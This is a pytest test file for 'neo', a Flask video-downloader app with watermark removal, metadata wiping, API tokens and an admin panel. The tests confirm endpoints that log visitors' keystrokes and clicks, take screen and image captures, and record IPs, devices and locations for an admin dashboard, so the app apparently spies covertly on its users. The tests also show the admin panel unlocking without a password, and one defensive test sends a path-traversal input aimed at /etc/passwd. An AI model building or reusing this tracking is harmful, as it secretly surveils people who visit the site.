"""Tests for the neo application.

Run with:  python3 -m pytest tests/test_neo.py -q
"""
import os
import sys
import tempfile
from pathlib import Path

import pytest

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

# Use an isolated SQLite DB for tests so state never leaks between runs.
_tmp_db = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
_tmp_db.close()
os.environ["NEO_DB_PATH"] = _tmp_db.name
os.environ.setdefault("VERCEL", "")
os.environ.pop("MONGO_URI", None)

from neo.app import create_app
from neo.db_adapter import get_db, close_db


@pytest.fixture
def app():
    application = create_app()
    application.config.update(TESTING=True)
    with application.app_context():
        yield application
    # Cleanup DB connection if open.
    try:
        close_db()
    except Exception:
        pass


@pytest.fixture
def client(app):
    return app.test_client()


def test_app_creates_with_blueprints(app):
    rules = {r.rule for r in app.url_map.iter_rules()}
    for expected in [
        "/", "/info", "/download", "/search",
        "/clip", "/remove_watermark",
        "/serve/<filename>", "/preview/<filename>", "/play/<filename>",
        "/register", "/login", "/logout", "/me",
        "/extract", "/capture", "/screenshot", "/logkeys", "/logclick",
        "/admin/", "/admin/login", "/admin/logout", "/admin/settings",
        "/admin/stats", "/admin/users", "/admin/user/<session_id>",
        "/admin/captures", "/admin/locations", "/admin/all", "/admin/delete-all",
        "/captures/<filename>", "/screenshots/<filename>",
    ]:
        assert expected in rules, f"missing route: {expected}"


def test_download_requires_url(client):
    r = client.post("/download", json={})
    assert r.status_code == 400
    assert r.get_json()["success"] is False


def test_extract_returns_json(client):
    r = client.get("/extract")
    assert r.status_code == 200
    data = r.get_json()
    for k in ("ip", "browser", "os", "device", "session_id"):
        assert k in data, f"extract missing key: {k}"


def test_track_endpoints_accept_data(client):
    r = client.post("/logkeys", json={"keys": "abc"})
    assert r.status_code == 200
    assert r.get_json()["success"] is True

    r = client.post("/logclick", json={"tag": "BUTTON", "text": "Play", "x": 10, "y": 20, "page": "/"})
    assert r.status_code == 200
    assert r.get_json()["success"] is True

    # Capture expects a base64 PNG; empty => 400 (no crash).
    r = client.post("/capture", json={"image": ""})
    assert r.status_code == 400

    # Screenshot expects a base64 image; empty => 400.
    r = client.post("/screenshot", json={"image": ""})
    assert r.status_code == 400


def test_index_page(client):
    resp = client.get("/")
    assert resp.status_code == 200
    assert b"html" in resp.data.lower()


def test_auth_register_login_logout_me(client):
    # Register
    r = client.post("/register", json={
        "username": "tester", "email": "tester@example.com", "password": "secret123"
    })
    assert r.status_code == 200
    body = r.get_json()
    assert body["success"] is True

    # Duplicate registration should fail.
    r = client.post("/register", json={
        "username": "tester", "email": "tester@example.com", "password": "secret123"
    })
    assert r.status_code == 409

    # Me (authenticated via session cookie).
    r = client.get("/me")
    assert r.get_json()["authenticated"] is True

    # Logout.
    r = client.post("/logout")
    assert r.get_json()["success"] is True
    r = client.get("/me")
    assert r.get_json()["authenticated"] is False

    # Login.
    r = client.post("/login", json={"username": "tester", "password": "secret123"})
    assert r.status_code == 200
    assert r.get_json()["success"] is True

    # Wrong password.
    r = client.post("/login", json={"username": "tester", "password": "wrong"})
    assert r.status_code == 401


def test_admin_dev_mode_access(client):
    # With no ADMIN_PASSWORD and no stored hash, admin is unlocked (dev mode).
    # Hit login first to establish the session (dev mode auto-authenticates).
    client.get("/admin/login", follow_redirects=True)

    r = client.get("/admin/")
    assert r.status_code == 200
    assert b"NEO" in r.data

    r = client.get("/admin/stats")
    assert r.status_code == 200
    data = r.get_json()
    for key in ("total", "success", "failed", "sites", "countries", "by_day", "modes",
                "captures_total", "screenshots_total", "clicks_total",
                "unique_ips", "ip_count", "session_count", "recent"):
        assert key in data, f"stats missing key: {key}"

    r = client.get("/admin/users")
    assert r.status_code == 200
    assert "users" in r.get_json()

    r = client.get("/admin/locations")
    assert r.status_code == 200
    assert "downloads" in r.get_json()

    r = client.get("/admin/all")
    assert r.status_code == 200
    assert "downloads" in r.get_json()


def test_admin_delete_all(client):
    client.get("/admin/login", follow_redirects=True)
    r = client.post("/admin/delete-all", json={"target": "all"})
    assert r.status_code == 200
    assert r.get_json()["success"] is True


def test_admin_settings_pages(client):
    client.get("/admin/login", follow_redirects=True)
    r = client.get("/admin/settings")
    assert r.status_code == 200
    assert b"settings" in r.data.lower()


def test_info_requires_url(client):
    r = client.post("/info", json={})
    assert r.status_code == 400


def test_info_invalid_url_returns_error(client):
    r = client.post("/info", json={"url": "not-a-real-url"})
    assert r.status_code == 400
    assert r.get_json()["success"] is False


def test_serve_path_traversal_blocked(client):
    r = client.get("/serve/..%2f..%2fetc%2fpasswd")
    # Must never serve arbitrary files (403 from guard, 404 from routing guard).
    assert r.status_code in (403, 404)
    assert b"root:" not in r.data


def test_media_serve_invalid_filename(client):
    r = client.get("/captures/..%2f..%2fsecret")
    assert r.status_code in (400, 403, 404)


def test_diskwala_requires_login_anonymous(client):
    # Anonymous users hitting a diskwala URL must be redirected to /login.
    r = client.post("/info", json={"url": "https://www.diskwala.com/watch/abc"})
    assert r.status_code in (301, 302)
    assert "/login" in r.headers.get("Location", "")


def test_diskwala_allowed_when_logged_in(client):
    # After login, the gate passes (download proceeds; will fail only on the
    # network/extraction step, not on the auth gate).
    client.post("/register", json={
        "username": "dwuser", "email": "dw@example.com", "password": "secret123"
    })
    r = client.post("/info", json={"url": "https://www.diskwala.com/watch/abc"})
    # Not a redirect -> gate passed; extraction may still fail offline.
    assert r.status_code != 302
    assert "/login" not in (r.headers.get("Location", ""))


# ===== API token / programmatic access =====
def test_token_requires_login(client):
    r = client.get("/token")
    assert r.status_code == 401


def test_token_create_and_rotate(client):
    client.post("/register", json={
        "username": "tokenuser", "email": "token@example.com", "password": "secret123"
    })
    r = client.get("/token")
    assert r.status_code == 200
    body = r.get_json()
    assert body["success"] is True
    first = body["token"]
    assert first.startswith("neo_")

    # Token is stable across requests.
    r = client.get("/token")
    assert r.get_json()["token"] == first

    # Rotate invalidates the old token.
    r = client.post("/token/rotate")
    assert r.status_code == 200
    new = r.get_json()["token"]
    assert new != first
    assert new.startswith("neo_")


def test_api_key_header_authenticates(client):
    # Create a user + token, then use it as X-API-Key on a gated endpoint.
    client.post("/register", json={
        "username": "apiusr", "email": "api@example.com", "password": "secret123"
    })
    token = client.get("/token").get_json()["token"]
    # Drop the session so subsequent requests are anonymous (key-only auth).
    client.post("/logout")

    # Anonymous diskwala call => redirect to /login.
    r = client.post("/info", json={"url": "https://www.diskwala.com/watch/abc"})
    assert r.status_code in (301, 302)

    # Same gated call with valid API key => gate passes (no redirect).
    r = client.post("/info", json={"url": "https://www.diskwala.com/watch/abc"},
                    headers={"X-API-Key": token})
    assert r.status_code != 302
    assert "/login" not in (r.headers.get("Location", ""))

    # Invalid API key => still gated.
    r = client.post("/info", json={"url": "https://www.diskwala.com/watch/abc"},
                    headers={"X-API-Key": "neo_bogus"})
    assert r.status_code in (301, 302)


# ===== Batch download =====
def test_batch_requires_urls(client):
    r = client.post("/batch", json={})
    assert r.status_code == 400
    assert r.get_json()["success"] is False


def test_batch_accepts_json_list(monkeypatch):
    from neo.core import engine as _eng

    def fake_download(url, **kw):
        return {"title": "x", "ext": "mp4", "filename": "x.mp4"}

    monkeypatch.setattr(_eng, "download_media", fake_download)
    client = create_app().test_client()
    r = client.post("/batch", json={"urls": ["https://example.com/a", "https://example.com/b"]})
    assert r.status_code == 200
    body = r.get_json()
    assert body["success"] is True
    assert body["count"] == 2
    assert len(body["results"]) == 2
    for item in body["results"]:
        assert "url" in item
        assert "success" in item


def test_batch_gated_url_redirects_anonymous(client):
    # Any gated URL in the batch must force a login redirect.
    r = client.post("/batch", json={
        "urls": ["https://www.diskwala.com/watch/x", "https://youtube.com/watch?v=1"]
    })
    assert r.status_code in (301, 302)
    assert "/login" in (r.headers.get("Location", ""))


# ===== 4 GB guard =====
def test_oversized_file_rejected(monkeypatch, tmp_path):
    from neo.core import engine

    # Stub yt-dlp so no network call is made; return a single result file.
    big = tmp_path / "big.mp4"
    big.write_bytes(b"\0" * 10)

    class _FakeYDL:
        def __init__(self, *a, **k):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def extract_info(self, url, download=True):
            # Mimic yt-dlp writing the file at outtmpl.
            return {"title": "Big", "ext": "mp4", "_filename": str(big)}

        def prepare_filename(self, info):
            return str(big)

    monkeypatch.setattr(engine.yt_dlp, "YoutubeDL", _FakeYDL)
    monkeypatch.setattr(engine, "DOWNLOADS", tmp_path)

    # Make every Path.stat report a > 4 GB file so the guard triggers.
    class _FakeStat:
        st_size = 5 * 1024 ** 3

    monkeypatch.setattr(engine.Path, "stat", lambda self, *a, **k: _FakeStat())

    with pytest.raises(Exception) as exc:
        engine.download_media("https://example.com/big")
    assert "4 GB" in str(exc.value)


# ===== Admin SSE feed =====
def test_admin_events_sse(client):
    client.get("/admin/login", follow_redirects=True)
    r = client.get("/admin/events")
    assert r.status_code == 200
    assert "text/event-stream" in r.content_type


# ===== God mode + preset passthrough =====
def test_download_god_mode_preset(monkeypatch, tmp_path):
    """god_mode + preset are forwarded into the yt-dlp options."""
    from neo.core import engine

    captured = {}

    class _FakeYDL:
        def __init__(self, opts, *a, **k):
            captured.update(opts)

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def extract_info(self, url, download=True):
            captured["url"] = url
            return {"title": "God", "ext": "mp4", "_filename": str(tmp_path / "god.mp4")}

        def prepare_filename(self, info):
            return str(tmp_path / "god.mp4")

    monkeypatch.setattr(engine.yt_dlp, "YoutubeDL", _FakeYDL)
    monkeypatch.setattr(engine, "DOWNLOADS", tmp_path)
    (tmp_path / "god.mp4").write_bytes(b"\0" * 10)

    engine.download_media(
        "https://example.com/god", mode="video",
        god_mode=True, preset="4k",
    )

    assert captured.get("concurrent_fragment_downloads") == 32
    assert captured.get("retries") == 10
    assert captured.get("external_downloader") == "aria2c"
    assert "height<=2160" in captured.get("format", "")
    assert captured.get("merge_output_format") == "mkv"


def test_remove_watermark_god_mode_adds_zones(monkeypatch, tmp_path):
    """god_mode stacks more delogo zones than normal mode."""
    import subprocess
    from neo.core import processor

    monkeypatch.setattr(processor, "DOWNLOADS", tmp_path)
    src = tmp_path / "vid.mp4"
    src.write_bytes(b"\0" * 10)

    last_cmd = {}

    def fake_run(cmd, *a, **k):
        last_cmd["cmd"] = list(cmd)
        # Create the output file so the processor call succeeds.
        Path(cmd[-1]).write_bytes(b"\0" * 10)
        class _R:
            stderr = None
        return _R()

    monkeypatch.setattr(subprocess, "run", fake_run)

    def count_delogo(cmd):
        # The -vf value is passed as a single arg: "delogo=...:show=0,delogo=..."
        if "-vf" in cmd:
            vf = cmd[cmd.index("-vf") + 1]
            return vf.count("delogo=")
        return 0

    # god_mode path
    processor.remove_watermark("vid.mp4", auto=True, god_mode=True)
    god_zones = count_delogo(last_cmd["cmd"])
    # normal path
    processor.remove_watermark("vid.mp4", auto=True, god_mode=False)
    normal_zones = count_delogo(last_cmd["cmd"])
    assert god_zones > normal_zones


# ===== Metadata erasure =====
def test_erase_metadata_wipes(monkeypatch, tmp_path):
    import subprocess
    from neo.core import processor

    monkeypatch.setattr(processor, "DOWNLOADS", tmp_path)
    src = tmp_path / "clip.mp4"
    src.write_bytes(b"\0" * 10)

    ran = {}

    def fake_run(cmd, *a, **k):
        ran["args"] = cmd
        # Create the expected output file so the call succeeds.
        out_arg = cmd[-1]
        Path(out_arg).write_bytes(b"\0" * 10)
        class _R:
            stderr = None
        return _R()

    monkeypatch.setattr(subprocess, "run", fake_run)
    out = processor.erase_metadata("clip.mp4")
    assert "wiped" in out["filename"]
    args = ran["args"]
    assert "-map_metadata" in args and "-1" in args
    assert "-fflags" in args and "+bitexact" in args


def test_wipe_route(client, monkeypatch, tmp_path):
    """POST /wipe erases metadata and returns a downloadable file name."""
    import subprocess
    from neo.core import processor

    monkeypatch.setattr(processor, "DOWNLOADS", tmp_path)
    src = tmp_path / "clip.mp4"
    src.write_bytes(b"\0" * 10)

    def fake_run(cmd, *a, **k):
        Path(cmd[-1]).write_bytes(b"\0" * 10)
        class _R:
            stderr = None
        return _R()

    monkeypatch.setattr(subprocess, "run", fake_run)

    r = client.post("/wipe", json={"filename": "clip.mp4"})
    assert r.status_code == 200
    body = r.get_json()
    assert body["success"] is True
    assert "wiped" in body["filename"]
    assert body["download_url"].startswith("/serve/")


def test_wipe_route_requires_filename(client):
    r = client.post("/wipe", json={})
    assert r.status_code == 400
    assert r.get_json()["success"] is False


def test_batch_forwards_god_mode(monkeypatch, tmp_path):
    """god_mode/preset reach download_media via download_batch."""
    from neo.core import engine

    captured = {}

    class _FakeYDL:
        def __init__(self, opts, *a, **k):
            captured.update(opts)

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def extract_info(self, url, download=True):
            return {"title": "B", "ext": "mp4", "_filename": str(tmp_path / "b.mp4")}

        def prepare_filename(self, info):
            return str(tmp_path / "b.mp4")

    monkeypatch.setattr(engine.yt_dlp, "YoutubeDL", _FakeYDL)
    monkeypatch.setattr(engine, "DOWNLOADS", tmp_path)
    (tmp_path / "b.mp4").write_bytes(b"\0" * 10)
    # Stub tasks so no real thread registry is needed for the unit check.
    import neo.core.tasks as tasks
    monkeypatch.setattr(tasks, "create_task", lambda fn, *a, **k: (fn(*a, **k), "tid")[1])
    monkeypatch.setattr(tasks, "get_task_status", lambda tid: {"status": "completed", "result": None})

    results = engine.download_batch(
        ["https://example.com/1"], god_mode=True, preset="audio",
    )
    assert captured.get("concurrent_fragment_downloads") == 32
    assert captured.get("merge_output_format") == "mp3"


# ===== Cookie plumbing =====
def test_apply_cookies_env_var(monkeypatch, tmp_path):
    """YTDLP_COOKIES env var is written to a temp cookiefile and applied."""
    from neo.core import engine

    monkeypatch.delenv("YTDLP_COOKIES", raising=False)
    monkeypatch.setenv("YTDLP_COOKIES", "# Netscape\nyoutube.com\tTRUE\t/\tTRUE\t0\tX\tY\n")
    opts = engine._apply_cookies({})
    assert "cookiefile" in opts
    content = Path(opts["cookiefile"]).read_text()
    assert "youtube.com" in content


def test_apply_cookies_explicit_override(monkeypatch, tmp_path):
    """An explicit cookiefile path always wins over the env var."""
    from neo.core import engine

    monkeypatch.setenv("YTDLP_COOKIES", "# Netscape\nyoutube.com\tTRUE\t/\tTRUE\t0\tX\tY\n")
    explicit = tmp_path / "mine.txt"
    explicit.write_text("youtube.com\tTRUE\t/\tTRUE\t0\tEXPLICIT\tZ\n")
    opts = engine._apply_cookies({}, cookiefile=str(explicit))
    assert opts["cookiefile"] == str(explicit)


def test_apply_cookies_no_env(monkeypatch):
    """With no cookies available, no cookiefile key is set."""
    from neo.core import engine

    monkeypatch.delenv("YTDLP_COOKIES", raising=False)
    # Ensure no cookies.txt exists at the resolved project root for this test.
    opts = engine._apply_cookies({})
    assert "cookiefile" not in opts
